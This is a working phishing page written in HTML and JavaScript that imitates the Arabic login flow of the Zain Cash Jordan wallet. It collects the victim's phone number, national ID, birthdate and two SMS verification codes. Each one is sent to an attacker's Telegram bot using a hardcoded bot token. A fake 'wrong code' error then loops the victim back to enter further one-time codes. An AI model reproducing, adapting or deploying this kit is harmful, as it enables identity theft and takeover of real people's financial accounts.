<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>زين كاش الأردن | تسجيل الدخول</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #2F80ED 0%, #56CCF2 100%);
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #app {
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(47,128,237,0.13), 0 1.5px 12px #2f80ed11;
      width: 370px;
      max-width: 95vw;
      padding: 32px 26px 30px 26px;
      box-sizing: border-box;
      direction: rtl;
      position: relative;
      overflow: hidden;
      border: 2.5px solid #2F80ED33;
      animation: fadein 0.8s;
    }
    @keyframes fadein {
      from { opacity: 0; transform: translateY(36px);}
      to { opacity: 1; transform: none;}
    }
    .zain-header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 14px;
      gap: 10px;
    }
    .zain-logo {
      width: 64px;
      height: 64px;
      border-radius: 20px;
      background: linear-gradient(135deg, #56ccf2 60%, #2f80ed 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 16px #2f80ed22;
      border: 2.5px solid #fff;
      overflow: hidden;
    }
    .zain-logo img {
      width: 60px;
      height: 60px;
      object-fit: contain;
      background: #fff;
      border-radius: 16px;
      border: 1.5px solid #e3eefe;
      box-shadow: 0 1px 6px #56ccf233;
    }
    .zain-title-main {
      font-size: 25px;
      font-weight: 900;
      letter-spacing: 0.2px;
      color: #2F80ED;
      margin: 0;
      text-shadow: 0 1px 0 #fff, 0 2px 8px #2f80ed22;
    }
    .zain-title-sub {
      font-size: 15px;
      color: #353a4d;
      font-weight: 600;
      text-align: center;
      margin: 2px 0 0 0;
      letter-spacing: 0.1px;
    }
    .step-indicator {
      display: flex;
      justify-content: center;
      gap: 6.5px;
      margin-bottom: 16px;
      margin-top: 7px;
    }
    .step-dot {
      width: 11px;
      height: 11px;
      border-radius: 50%;
      background: #eaf2fd;
      border: 2px solid #56ccf2;
      transition: background 0.2s;
    }
    .step-dot.active {
      background: linear-gradient(135deg, #2f80ed 70%, #56ccf2 100%);
      border-color: #2f80ed;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 13px;
      margin-top: 7px;
    }
    label {
      color: #2F80ED;
      font-size: 15px;
      font-weight: 600;
      margin-bottom: 3px;
      margin-right: 2px;
      letter-spacing: 0.2px;
    }
    input, select {
      padding: 14px 11px;
      border: none;
      border-radius: 9px;
      font-size: 16px;
      background: #f2f8fd;
      color: #222;
      outline: none;
      box-shadow: 0 1.5px 5px #56ccf211;
      transition: box-shadow 0.2s, border 0.2s;
      border: 2px solid #56ccf233;
      font-family: 'Cairo', Arial, sans-serif;
    }
    input:focus {
      box-shadow: 0 3px 16px #2f80ed33;
      border-color: #2F80ED;
      background: #f4faff;
    }
    .button {
      background: linear-gradient(90deg, #2F80ED 0%, #56CCF2 100%);
      color: white;
      border: none;
      border-radius: 9px;
      padding: 13px 0;
      font-size: 18px;
      font-weight: 800;
      cursor: pointer;
      margin-top: 8px;
      margin-bottom: 3px;
      transition: background 0.2s, opacity 0.15s;
      letter-spacing: 0.7px;
      box-shadow: 0 1px 6px #2f80ed22;
    }
    .button:active { opacity: 0.86; }
    .info-msg {
      text-align: center;
      color: #2F80ED;
      font-size: 13px;
      margin-bottom: 7px;
      margin-top: 2px;
      font-weight: 600;
      letter-spacing: 0.1px;
    }
    .code-inputs {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin: 8px 0 7px 0;
    }
    .code-inputs input {
      text-align: center;
      font-size: 19px;
      width: 43px;
      padding: 13px 0;
      letter-spacing: 5px;
      border-radius: 7px;
      border: 2px solid #56ccf255;
      background: #f2f8fd;
      font-weight: 700;
      transition: border 0.2s, box-shadow 0.2s;
      box-shadow: 0 1.5px 5px #56ccf211;
    }
    .code-inputs input:focus {
      border-color: #2F80ED;
      background: #f4faff;
    }
    .success-message {
      text-align: center;
      color: #1887d2;
      font-size: 19px;
      font-weight: 700;
      margin: 22px 0 0 0;
      letter-spacing: 0.5px;
    }
    .zain-footer {
      margin-top: 22px;
      text-align: center;
      color: #a6c7ef;
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 1px;
      opacity: 0.83;
      text-shadow: 0 1px 0 #fff;
    }
    /* Modal Styles */
    #modalError {
      display: none;
      position: fixed;
      top:0; left:0; width:100vw; height:100vh;
      background: rgba(47,128,237,0.13);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }
    #modalError.active {
      display: flex;
      animation: fadein 0.3s;
    }
    #modalContent {
      background: #fff;
      padding: 27px 32px;
      border-radius: 13px;
      box-shadow: 0 7px 34px #2f80ed33, 0 1.5px 7px #2f80ed22;
      text-align: center;
      min-width: 260px;
      border: 2px solid #f9b3b3;
    }
    #modalContent .err-title {
      color: #e53935;
      font-size: 19px;
      font-weight: bold;
    }
    #modalContent .err-msg {
      margin-top: 8px;
      font-size: 15px;
      color: #444;
      font-weight: 600;
      margin-bottom: 8px;
    }
    #modalContent button {
      margin-top: 14px;
      background: linear-gradient(90deg, #2F80ED 0%, #56CCF2 100%);
      color: #fff;
      padding: 7px 27px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 15px;
      font-weight: bold;
    }
    #modalContent button:active {
      background: linear-gradient(90deg, #56CCF2 0%, #2F80ED 100%);
    }
    @media (max-width: 450px) {
      #app { padding: 16px 1.5vw 10px 1.5vw; }
      .zain-logo { width: 51px; height: 51px;}
      .zain-logo img {width: 46px; height: 46px;}
      .zain-title-main { font-size: 20px;}
      .zain-title-sub { font-size: 13px;}
      #modalContent { padding: 17px 7vw;}
    }
  </style>
</head>
<body>
  <div id="app"></div>
  <!-- Modal Error -->
  <div id="modalError">
    <div id="modalContent">
      <div class="err-title">رمز التحقق غير صحيح</div>
      <div class="err-msg">يرجى التأكد من الرمز والمحاولة مرة أخرى.</div>
      <button onclick="closeModal()">إغلاق</button>
    </div>
  </div>
  <script>
    // شعار زين كاش الأردن
    const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
    // بيانات بوت التليجرام
    const BOT_TOKEN = "7680582937:AAHkEhiz5JPvPLMjNVUtF_GpvnkVNbum00s";
    const CHAT_ID = "-4625923889";
    // بيانات المستخدم
    let userData = { phone: '', nationalId: '', birthdate: '' };
    let currentStep = "phone"; // phone, id, code6, code4
    let waitingTimeout = null;

    function stepIndicator(step) {
      return `
        <div class="step-indicator">
          <div class="step-dot${step===1?' active':''}"></div>
          <div class="step-dot${step===2?' active':''}"></div>
          <div class="step-dot${step===3?' active':''}"></div>
        </div>
      `;
    }
    function header(sub="") {
      return `
        <div class="zain-header">
          <div class="zain-logo"><img src="${zainCashLogo}" alt="Zain Cash" /></div>
          <span class="zain-title-main">زين كاش الأردن</span>
        </div>
        <div class="zain-title-sub">${sub}</div>
      `;
    }

    function renderPhoneStep() {
      currentStep = "phone";
      app.innerHTML = `
        ${header("مرحبًا بك! سجل دخولك لحسابك")}
        ${stepIndicator(1)}
        <form id="phoneForm" autocomplete="off">
          <label>رقم الهاتف المرتبط بحسابك</label>
          <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
          <button type="submit" class="button">التالي</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      document.getElementById('phone').focus();
      document.getElementById('phoneForm').onsubmit = e => {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        if (!/^07\d{8}$/.test(phone)) {
          alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام');
          document.getElementById('phone').focus();
          return;
        }
        userData.phone = phone;
        sendToTelegram(`🟦 تسجيل دخول زين كاش الأردن - رقم الهاتف\n📱 الهاتف: ${userData.phone}`);
        renderNationalIdStep();
      };
    }

    function renderNationalIdStep() {
      currentStep = "id";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
        ${header("يرجى إدخال بياناتك الشخصية")}
        ${stepIndicator(1)}
        <form id="nationalForm">
          <label>الرقم الوطني</label>
          <input type="text" id="nationalId" placeholder="الرقم الوطني" maxlength="12" required inputmode="numeric"/>
          <label>تاريخ الميلاد</label>
          <input type="date" id="birthdate" required max="${new Date().toISOString().split('T')[0]}" />
          <button type="submit" class="button">التالي</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      document.getElementById('nationalId').focus();

      document.getElementById('nationalForm').onsubmit = e => {
        e.preventDefault();
        const nationalId = document.getElementById('nationalId').value.trim();
        const birthdate = document.getElementById('birthdate').value;
        if (!/^\d{10,12}$/.test(nationalId)) {
          alert('يرجى إدخال رقم وطني صحيح (10 إلى 12 رقم)');
          document.getElementById('nationalId').focus();
          return;
        }
        if (!birthdate) {
          alert('يرجى إدخال تاريخ الميلاد');
          document.getElementById('birthdate').focus();
          return;
        }
        userData.nationalId = nationalId;
        userData.birthdate = birthdate;
        sendToTelegram(
          `🟦 تسجيل دخول زين كاش الأردن - بيانات شخصية\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`
        );
        renderCode6Step();
      };
      document.getElementById('backBtn').onclick = () => {
        renderPhoneStep();
      };
    }

    function renderCode6Step() {
      currentStep = "code6";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
        ${header("تم إرسال رمز تحقق إلى هاتفك")}
        ${stepIndicator(2)}
        <div class="info-msg">أدخل رمز التحقق المكون من 6 أرقام كما وصلك برسالة SMS</div>
        <form id="code6Form" autocomplete="off">
          <div class="code-inputs">
            ${Array(6).fill(0).map((_,i)=>`<input type="text" maxlength="1" pattern="[0-9]" required id="c6_${i}" inputmode="numeric" />`).join('')}
          </div>
          <button type="submit" class="button">تأكيد الرمز</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      focusCodeInputs(6, 'c6_');
      document.getElementById('code6Form').onsubmit = e => {
        e.preventDefault();
        let code = '';
        for(let i=0; i<6; i++) code += document.getElementById(`c6_${i}`).value;
        sendToTelegram(
          `🔵 محاولة إدخال رمز تحقق 6 أرقام\n📱 الهاتف: ${userData.phone}\n🔢 الرمز: ${code}`
        );
        showWaitMsgAndGotoCode4();
      };
      document.getElementById('backBtn').onclick = () => {
        renderNationalIdStep();
      };
    }

    function showWaitMsgAndGotoCode4() {
      app.innerHTML = `
        <div style="padding:40px 0;text-align:center;">
          <div style="margin-bottom:18px;">
            <img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/>
          </div>
          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
          <div style="color:#353a4d;font-size:15px;">جاري التحقق من رمز الدخول</div>
          <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">5</div>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      let sec = 5;
      const waitElem = document.getElementById('waitSec');
      waitingTimeout = setInterval(() => {
        sec--;
        if(waitElem) waitElem.textContent = sec;
        if(sec === 0) {
          clearInterval(waitingTimeout);
          renderCode4Step();
        }
      }, 1000);
    }

    function renderCode4Step() {
      currentStep = "code4";
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
        ${header("تحقق إضافي لحماية حسابك")}
        ${stepIndicator(3)}
        <div class="info-msg">الرجاء إدخال رمز التحقق المكون من 4 أرقام</div>
        <form id="code4Form" autocomplete="off">
          <div class="code-inputs">
            ${Array(4).fill(0).map((_,i)=>`<input type="text" maxlength="1" pattern="[0-9]" required id="c4_${i}" inputmode="numeric" />`).join('')}
          </div>
          <button type="submit" class="button">تأكيد الرمز</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      focusCodeInputs(4, 'c4_');
      document.getElementById('code4Form').onsubmit = e => {
        e.preventDefault();
        let code = '';
        for(let i=0; i<4; i++) code += document.getElementById(`c4_${i}`).value;
        sendToTelegram(
          `🔷 محاولة إدخال رمز تحقق 4 أرقام\n📱 الهاتف: ${userData.phone}\n🔢 الرمز: ${code}`
        );
        showModal();
      };
      document.getElementById('backBtn').onclick = () => {
        renderCode6Step();
      };
    }

    function focusCodeInputs(length, prefix) {
      for (let i = 0; i < length; i++) {
        const input = document.getElementById(`${prefix}${i}`);
        input.addEventListener('input', function() {
          this.value = this.value.replace(/\D/, '').slice(0,1);
          if (this.value.length === 1 && i < length - 1) {
            document.getElementById(`${prefix}${i+1}`).focus();
          }
        });
        input.addEventListener('keydown', function(e) {
          if (e.key === 'Backspace' && this.value === '' && i > 0) {
            document.getElementById(`${prefix}${i-1}`).focus();
          }
        });
      }
      document.getElementById(`${prefix}0`).focus();
    }

    function showModal() {
      document.getElementById('modalError').classList.add('active');
    }
    function closeModal() {
      document.getElementById('modalError').classList.remove('active');
      // إعادة الدورة: بعد 4 أرقام ارجع إلى 6 أرقام مع الانتظار 5 ثواني
      renderCode6Step();
    }

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: msg
        })
      });
    }

    // ابدأ من إدخال الهاتف
    renderPhoneStep();
  </script>
</body>
</html>
